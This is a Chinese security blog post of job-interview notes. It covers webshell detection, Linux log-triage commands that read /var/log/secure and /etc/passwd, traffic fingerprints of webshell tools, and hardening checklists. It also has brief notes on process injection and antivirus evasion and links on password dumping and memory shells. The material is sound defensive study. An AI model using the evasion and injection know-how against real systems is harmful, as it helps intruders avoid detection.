+<h1 id="判断是不是webshell"><a href="#判断是不是webshell" class="headerlink" title="判断是不是webshell"></a>判断是不是webshell</h1><p>静态检测</p>
+<p>静态检测通过匹配特征码，特征值，危险函数函数来查找 webshell 的方法，只能查找已知的 webshell</p>
+<p>动态检测</p>
+<p>webshell 传到服务器了，在执行函数时这些对于系统调用、系统配置、数据库、文件的操作动作都是可以作为判断依据</p>
+<p>日志检测</p>
+<p>使用 webshell 一般不会在系统日志中留下记录，但是会在网站的 web 日志中留下 webshell 页面的访问数据和数据提交记录</p>
+<p>语法检测</p>
+<p>语法语义分析形式，是根据 php 语言扫描编译的实现方式，进行剥离代码、注释，分析变量、函数、字符串、语言结构的分析方式，来实现关键危险函数的捕捉方式这样可以完美解决漏报的情况但误报上</p>
+<h1 id="linux日志"><a href="#linux日志" class="headerlink" title="linux日志"></a>linux日志</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220613145246204.png" alt="image-20220613145246204"></p>
+<h1 id="linux命令"><a href="#linux命令" class="headerlink" title="linux命令"></a>linux命令</h1><p>网络连接：netstat -antlp  查看CPU占用率：top<br>查看操作命令中的相关信息：history | grep xmrig<br>查看登陆信息：last  失败的登陆信息：lastb</p>
+<p>查看是否存在其它特权用户：<br>awk -F: ‘$3&#x3D;&#x3D;0{print $1}’ &#x2F;etc&#x2F;passwd<br>黑客爆破shh服务的次数<br>grep -o “Failed password” &#x2F;var&#x2F;log&#x2F;secure | uniq -c<br>第一次爆破时间or最后一次爆破时间<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure|head -1<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure|tail -1<br>爆破的IP<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure|grep -E -o “(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)”|uniq -c | sort -nr<br>爆破的用户名<br>grep “Failed password” &#x2F;var&#x2F;log&#x2F;secure|perl -e ‘while($_&#x3D;&lt;&gt;){ &#x2F;for(.*?) from&#x2F;; print “$1\n”;}’|uniq -c|sort -nr<br>管理员最近登录情况<br>grep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $1,$2,$3,$9,$11}’<br>登录成功的IP<br>grep “Accepted “ &#x2F;var&#x2F;log&#x2F;secure | awk ‘{print $11}’ | sort | uniq -c | sort -nr | more<br>网络连接<br>netstat -antlp | more<br>异常外联对应程序位置<br>ls -l &#x2F;proc&#x2F;9637<br>定时任务<br>cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;<br>自启服务及对应文件<br>chkconfig –list<br>find &#x2F; -name centos_core.sh<br>自启服务文件时间<br>stat &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;centos_core.sh<br>定时任务日志<br>cat &#x2F;var&#x2F;log&#x2F;cron<br>添加用户日志<br>grep “useradd” &#x2F;var&#x2F;log&#x2F;secure<br>异常文件时间信息<br>stat &#x2F;root&#x2F;centos_core.elf<br>stat &#x2F;shell.elf<br>计算文件哈希值<br>md5sum &#x2F;shell.elf<br>md5sum &#x2F;root&#x2F;centos_core.elf</p>
+<h1 id="手工检测Webshell的思路？"><a href="#手工检测Webshell的思路？" class="headerlink" title="手工检测Webshell的思路？"></a>手工检测Webshell的思路？</h1><p><a target="_blank" rel="noopener" href="https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89/">https://blog.riskivy.com/%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84webshell%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E4%B8%8E%E5%AE%9E%E7%8E%B0%EF%BC%88%E4%B8%8A%EF%BC%89/</a></p>
+<h1 id="webshell流量信息"><a href="#webshell流量信息" class="headerlink" title="webshell流量信息"></a>webshell流量信息</h1><p><strong>菜刀</strong></p>
+<p>菜刀 webshell 只使用了 url 编码 + base64 编码</p>
+<p>shell 特征就是传输参数名为 z0,还存在<code>int_set(&quot;display_erros&quot;**,**&quot;0&quot;)</code>字符串特征</p>
+<p><strong>蚁剑</strong></p>
+<p>默认的蚁剑 shell,连接时会请求两次,其请求体只是经过 url 编码,其流量中也存在和蚁剑一样的代码</p>
+<p>第一次请求,关闭报错和 magic_quotes,接下来去获取主机的信息</p>
+<p>第二次请求,会把主机目录列出来</p>
+<p>蚁剑单向加密,支持客户端传入信息</p>
+<p><strong>冰蝎3.0</strong></p>
+<p>使用 aes 加密发起两次请求</p>
+<p>冰蝎是双向加密的</p>
+<p><strong>哥斯拉</strong></p>
+<p>支持 n 种加密</p>
+<p>采用了和冰蝎 3.0 一样的密钥交换方式,哥斯拉建立连接时会发起三次请求,第一次请求数据超级长,建立 session,第二三次请求确认连接</p>
+<p><strong>Weevely</strong></p>
+<p>信息payload放于accetp头中,采用gzip压缩传输,使用异或加密.进行base64加密</p>
+<h1 id="CS跟MSF打过内网吗？"><a href="#CS跟MSF打过内网吗？" class="headerlink" title="CS跟MSF打过内网吗？"></a>CS跟MSF打过内网吗？</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/244095.html">https://www.freebuf.com/vuls/244095.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1802226">https://cloud.tencent.com/developer/article/1802226</a></p>
+<h1 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h1><p>由于防火墙对于系统中正常的网络相关进程(例如Services.exe、Svchost.exe等)默认都是放行的，因此，木马一般都是注入到这些系统进程当中，并以此来穿透防火墙。</p>
+<h1 id="正向连接跟反向连接的区别？"><a href="#正向连接跟反向连接的区别？" class="headerlink" title="正向连接跟反向连接的区别？"></a>正向连接跟反向连接的区别？</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2549">https://xz.aliyun.com/t/2549</a></p>
+<h1 id="有没有抓过密码？2012前后版本有啥区别？"><a href="#有没有抓过密码？2012前后版本有啥区别？" class="headerlink" title="有没有抓过密码？2012前后版本有啥区别？"></a>有没有抓过密码？2012前后版本有啥区别？</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/175364nnnn">https://www.anquanke.com/post/id/175364nnnn</a></p>
+<h1 id="拿到日志如何分析？"><a href="#拿到日志如何分析？" class="headerlink" title="拿到日志如何分析？"></a>拿到日志如何分析？</h1><h2 id="特征字符分析"><a href="#特征字符分析" class="headerlink" title="特征字符分析"></a>特征字符分析</h2><p>在日志中寻找已知的漏洞特征</p>
+<h2 id="访问频率分析"><a href="#访问频率分析" class="headerlink" title="访问频率分析"></a>访问频率分析</h2><p>在攻击过程中,需要对系统进行各种特定的访问,这些访问与正常使用的用户访问区别较大,每一种工具行为都有不同的特征</p>
+<h3 id="漏洞扫描检查"><a href="#漏洞扫描检查" class="headerlink" title="漏洞扫描检查"></a>漏洞扫描检查</h3><p>可以匹配user-agent特征的方式进行检测</p>
+<h3 id="暴力破解检测"><a href="#暴力破解检测" class="headerlink" title="暴力破解检测"></a>暴力破解检测</h3><h3 id="webshell检测"><a href="#webshell检测" class="headerlink" title="webshell检测"></a>webshell检测</h3><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/456903115">https://zhuanlan.zhihu.com/p/456903115</a></p>
+<h1 id="java执行代码的rce有过了解吗？类似php的eval"><a href="#java执行代码的rce有过了解吗？类似php的eval" class="headerlink" title="java执行代码的rce有过了解吗？类似php的eval"></a>java执行代码的rce有过了解吗？类似php的eval</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/262005.html">https://www.freebuf.com/articles/web/262005.html</a></p>
+<h1 id="询问java内存马的了解程度"><a href="#询问java内存马的了解程度" class="headerlink" title="询问java内存马的了解程度"></a>询问java内存马的了解程度</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p>
+<h1 id="windows入侵排查思路"><a href="#windows入侵排查思路" class="headerlink" title="windows入侵排查思路"></a>windows入侵排查思路</h1><ol>
+<li>查看系统账号安全</li>
+<li>查看注册表中是否有隐藏账号</li>
+<li>检查异常端口 进程</li>
+<li>检查启动项 计划任务 服务</li>
+<li>检查系统相关信息</li>
+<li>日志分析 (C:\Windows\System32\winevt\Logs) 事件查看器</li>
+<li>搜索一下有没有可疑bat exe文件</li>
+</ol>
+<h1 id="linux入侵排查思路"><a href="#linux入侵排查思路" class="headerlink" title="linux入侵排查思路"></a>linux入侵排查思路</h1><ol>
+<li>账号安全查看&#x2F;etc&#x2F;passwd &#x2F;etc&#x2F;shadow</li>
+<li>历史命令 .bash_history</li>
+<li>异常端口 netstat -a -t -u</li>
+<li>检查异常进程 ps </li>
+<li>检查开机启动项 &#x2F;etc&#x2F;rc.local </li>
+<li>检查定时任务 crontab -l</li>
+<li>检查服务 chkconfig -list</li>
+<li>检查异常文件 找.php后缀文件</li>
+<li>检查系统日志</li>
+</ol>
+<h1 id="linux加固思路"><a href="#linux加固思路" class="headerlink" title="linux加固思路"></a>linux加固思路</h1><ol>
+<li>删除无用账号</li>
+<li>检查特殊账号</li>
+<li>添加口令策略</li>
+<li>限制su</li>
+<li>进制root直接登录</li>
+<li>设置隐藏文件属性(先最小,后加)</li>
+<li>关闭不必要服务</li>
+<li>更改ssh端口号 防爆破</li>
+<li>记录日志</li>
+</ol>
+<h1 id="windows加固"><a href="#windows加固" class="headerlink" title="windows加固"></a>windows加固</h1><ol>
+<li>在win ser2016中如何管理重命名administrator,禁用GUEST</li>
+<li>系统不显示上次登录的账户名。</li>
+<li>清理系统无效账户.</li>
+<li>按用户类型分配账号</li>
+<li>配置密码策略</li>
+<li>账户锁定策略</li>
+<li>远端系统强制关机设置</li>
+<li>本地关机设置</li>
+<li>用户权限指派</li>
+<li>授权账户本地登录</li>
+<li>授权账户从网络访问</li>
+</ol>
+<h1 id="OSI七层模型？"><a href="#OSI七层模型？" class="headerlink" title="OSI七层模型？"></a>OSI七层模型？</h1><p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/32059190">https://zhuanlan.zhihu.com/p/32059190</a></p>
+<h1 id="三次握手-x2F-四次握手？"><a href="#三次握手-x2F-四次握手？" class="headerlink" title="三次握手&#x2F;四次握手？"></a>三次握手&#x2F;四次握手？</h1><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/smileiam/article/details/78226816">https://blog.csdn.net/smileiam/article/details/78226816</a></p>
+<h1 id="免杀有了解吗？逆向呢？钓鱼呢？"><a href="#免杀有了解吗？逆向呢？钓鱼呢？" class="headerlink" title="免杀有了解吗？逆向呢？钓鱼呢？"></a>免杀有了解吗？逆向呢？钓鱼呢？</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>免杀大概分为两种情况</p>
+<ol>
+<li>二进制免杀(无源码),只能通过修改asm代码 二进制数据 其他数据来完成免杀</li>
+<li>有源码的免杀,可以通过修改源代码来完成免杀,也可以结合二进制免杀的技术</li>
+</ol>
+<p>免杀也可以分为这两种情况</p>
+<ol>
+<li>静态文件免杀,被杀毒软件病毒  云查杀了,也就是文件特征码在病毒库了.免杀方式可能是上面的两种方式,看情况</li>
+<li>动态行为免杀,运行中执行的某些行为被杀毒软件拦截报读.行为免杀如果没有源码就不是很好搞了</li>
+</ol>
+<h2 id="静态免杀"><a href="#静态免杀" class="headerlink" title="静态免杀"></a>静态免杀</h2><p>静态免杀针对的是杀毒软件的静态文件扫描,云查杀(病毒库).杀毒是提取文件一段特征码来识别病毒文件.</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">能识别一个程序的是一个病毒的一段不大于64字节的特征串</span><br></pre></td></tr></table></figure>
+
+<p>如果我们知道了一个文件是病毒,那么通过md5可定可以判断就是这个病毒文件.那么如果该病毒文件做了小小的变动呢,直接md5肯定不行了,那么杀毒软件是怎么做的呢?那么这里有一个叫做模糊哈希算法的东西</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">模糊哈希算法又叫基于内容分割的分片分片哈希算法,主要用于文件的相似性进行比较</span><br></pre></td></tr></table></figure>
+
+<p>大致就可以理解为,不要把一个文件的所有内容都拿来计算hash,而通过分片,取出部分重要(不易改变)的内容进行hash计算,这样就能达到通过特征码找到类似的病毒变种</p>
+<p>具体杀毒软件是不是通过这个算法来计算特征码的,也不是很清楚</p>
+<ol>
+<li>特征码会有多个串组合(减少误报)</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10369">https://xz.aliyun.com/t/10369</a></p>
+<p><a target="_blank" rel="noopener" href="https://cn-sec.com/archives/834733.html">https://cn-sec.com/archives/834733.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1593705">https://cloud.tencent.com/developer/article/1593705</a></p>
+<h1 id="怎么做免杀？"><a href="#怎么做免杀？" class="headerlink" title="怎么做免杀？"></a>怎么做免杀？</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10369">https://xz.aliyun.com/t/10369</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/322370.html">https://www.freebuf.com/articles/web/322370.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/160763126">https://zhuanlan.zhihu.com/p/160763126</a></p>
+<h1 id="jsp免杀"><a href="#jsp免杀" class="headerlink" title="jsp免杀"></a>jsp免杀</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10507">https://xz.aliyun.com/t/10507</a></p>
+<h1 id="使用-Dockerfile-定制镜像"><a href="#使用-Dockerfile-定制镜像" class="headerlink" title="使用 Dockerfile 定制镜像"></a>使用 Dockerfile 定制镜像</h1><p><a target="_blank" rel="noopener" href="https://yeasy.gitbook.io/docker_practice/image/build">https://yeasy.gitbook.io/docker_practice/image/build</a></p>
+<h1 id="tcp与udp的区别"><a href="#tcp与udp的区别" class="headerlink" title="tcp与udp的区别"></a>tcp与udp的区别</h1><p><strong>tcp</strong></p>
+<ol>
+<li>tcp是需要连接的</li>
+<li>可靠传输</li>
+<li>只能一对一通讯</li>
+<li>安全性比udp低</li>
+</ol>
+<p><strong>udp</strong></p>
+<ol>
+<li>无连接</li>
+<li>不可靠传输</li>
+<li>一对多</li>
+</ol>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E9%9D%A2%E8%AF%95/">面试</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/%E5%85%B6%E4%BB%96/windows%E4%B8%8B%E7%9A%84wsl-kail/%E5%85%B6%E4%BB%96/wsl-kail/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/10/18/21/28/seljalandsfoss-1751463_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">windows下的wsl-kail</div></div></a></div><div class="next-post pull-right"><a href="/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E7%AE%80/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95(%E7%AE%80)/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">面试题目(简)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95%E9%A2%98%E7%9B%AE-%E7%AE%80/%E5%85%B6%E4%BB%96/%E9%9D%A2%E8%AF%95(%E7%AE%80)/" title="面试题目(简)"><img class="cover" src="https://cdn.pixabay.com/photo/2018/08/23/07/35/thunderstorm-3625405_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">面试题目(简)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%AB%99%E7%82%B9%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">1.</span> <span class="toc-text">获取目标站点的绝对路径</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%8E%E6%A0%B7%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">怎样进行信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95cdn"><span class="toc-number">3.</span> <span class="toc-text">绕cdn</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%A6%82%E4%BD%95%E5%8E%BB%E6%B5%8B"><span class="toc-number">4.</span> <span class="toc-text">只有一个登录页面如何去测</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">4.1.</span> <span class="toc-text">测试逻辑漏洞点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.2.</span> <span class="toc-text">sql注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#js%E4%BB%A3%E7%A0%81%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8js%E6%8E%A5%E5%8F%A3%E6%B3%84%E9%9C%B2"><span class="toc-number">4.3.</span> <span class="toc-text">js代码是否存在js接口泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">4.4.</span> <span class="toc-text">目录扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E6%BC%8F%E6%B4%9E%E5%BA%93%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E"><span class="toc-number">4.5.</span> <span class="toc-text">查看漏洞库是否存在历史漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E9%A1%B5%E9%9D%A2%E5%85%B3%E9%94%AE%E8%AF%8D%E5%8E%BB%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E%E6%90%9C%E7%B4%A2"><span class="toc-number">4.6.</span> <span class="toc-text">提取页面关键词去黑暗引擎搜索</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%9C%89%E9%AA%8C%E8%AF%81%E7%A0%81-%E8%83%BD%E6%83%B3%E5%88%B0%E5%93%AA%E4%BA%9B%E5%8A%9F%E8%83%BD%E7%82%B9%E6%9D%A5%E5%88%A9%E7%94%A8-%E6%8C%96%E6%BC%8F%E6%B4%9E-%EF%BC%9F"><span class="toc-number">5.</span> <span class="toc-text">网站有验证码,能想到哪些功能点来利用(挖漏洞)？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8%E8%AE%BE%E8%AE%A1%E7%BC%BA%E9%99%B7"><span class="toc-number">5.1.</span> <span class="toc-text">通用设计缺陷</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E6%97%A0%E6%95%88"><span class="toc-number">5.1.1.</span> <span class="toc-text">验证码无效</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%94%B1%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%94%9F%E6%88%90-%E9%AA%8C%E8%AF%81"><span class="toc-number">5.1.2.</span> <span class="toc-text">验证码由客户端生成 验证</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E6%9C%89%E5%9B%9E%E6%98%BE"><span class="toc-number">5.1.3.</span> <span class="toc-text">验证码有回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%BA%E5%AE%9A"><span class="toc-number">5.1.4.</span> <span class="toc-text">验证码固定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8F%AF%E4%BB%A5%E7%88%86%E7%A0%B4"><span class="toc-number">5.1.5.</span> <span class="toc-text">验证码可以爆破</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E5%8F%AF%E7%8C%9C%E8%A7%A3"><span class="toc-number">5.1.6.</span> <span class="toc-text">验证码可猜解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%BB%95%E8%BF%87"><span class="toc-number">5.1.7.</span> <span class="toc-text">可绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81%E5%90%97"><span class="toc-number">5.2.</span> <span class="toc-text">图片验证吗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%AD%E4%BF%A1%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">5.3.</span> <span class="toc-text">短信验证码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8"><span class="toc-number">5.3.1.</span> <span class="toc-text">短信轰炸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C"><span class="toc-number">5.3.2.</span> <span class="toc-text">任意用户注册</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">5.3.3.</span> <span class="toc-text">任意用户密码重置</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#IIS%E6%90%AD%E5%BB%BA%E7%9A%84%E7%BD%91%E7%AB%99%E5%A6%82%E4%BD%95%E6%89%BE%E6%BC%8F%E6%B4%9E%EF%BC%9F"><span class="toc-number">6.</span> <span class="toc-text">IIS搭建的网站如何找漏洞？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#load-data-local%E8%AF%BB%E5%85%A5%E8%A1%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">7.</span> <span class="toc-text">load data local读入表条件</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#load-data-infile"><span class="toc-number">7.1.</span> <span class="toc-text">load data infile</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5ban%E4%BA%86sleep%E6%80%8E%E4%B9%88%E5%AE%9E%E7%8E%B0%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">8.</span> <span class="toc-text">sql注入ban了sleep怎么实现时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sleep"><span class="toc-number">8.1.</span> <span class="toc-text">sleep()</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#benchmark-%E9%87%8D%E5%A4%8D%E6%89%A7%E8%A1%8C%E6%9F%90%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">8.2.</span> <span class="toc-text">benchmark()重复执行某表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%9B%E5%8D%A1%E5%B0%94%E7%A7%AF"><span class="toc-number">8.3.</span> <span class="toc-text">笛卡尔积</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-lock-%E5%8A%A0%E9%94%81"><span class="toc-number">8.4.</span> <span class="toc-text">get_lock 加锁</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rlike-regexp-%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D"><span class="toc-number">8.5.</span> <span class="toc-text">rlike regexp 正则匹配</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#sqlmap%E7%9A%84os-shell%E5%8E%9F%E7%90%86"><span class="toc-number">9.</span> <span class="toc-text">sqlmap的os shell原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf%E7%9A%84%E6%96%B9%E5%BC%8F"><span class="toc-number">10.</span> <span class="toc-text">SQL注入绕waf的方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%99%BD%E7%9B%92"><span class="toc-number">10.1.</span> <span class="toc-text">白盒</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E7%9B%92"><span class="toc-number">10.2.</span> <span class="toc-text">黑盒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E7%BB%95waf"><span class="toc-number">10.2.1.</span> <span class="toc-text">架构层绕waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E9%99%90%E5%88%B6%E8%A7%92%E5%BA%A6%E7%BB%95%E8%BF%87waf"><span class="toc-number">10.2.2.</span> <span class="toc-text">资源限制角度绕过waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%8F%E8%AE%AE%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87waf"><span class="toc-number">10.2.3.</span> <span class="toc-text">协议层面绕过waf</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%84%E5%88%99%E5%B1%82%E9%9D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">10.2.4.</span> <span class="toc-text">规则层面绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="toc-number">11.</span> <span class="toc-text">SQL注入过滤逗号如何处理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0"><span class="toc-number">12.</span> <span class="toc-text">报错注入函数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpmyadmin%E5%A6%82%E4%BD%95%E6%8B%BFshell"><span class="toc-number">13.</span> <span class="toc-text">phpmyadmin如何拿shell?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA"><span class="toc-number">13.1.</span> <span class="toc-text">数据库文件导入导出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5"><span class="toc-number">13.2.</span> <span class="toc-text">数据库全局日志写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97%E5%86%99%E5%85%A5"><span class="toc-number">13.3.</span> <span class="toc-text">数据库慢查询日志写入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE"><span class="toc-number">13.4.</span> <span class="toc-text">CVE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" 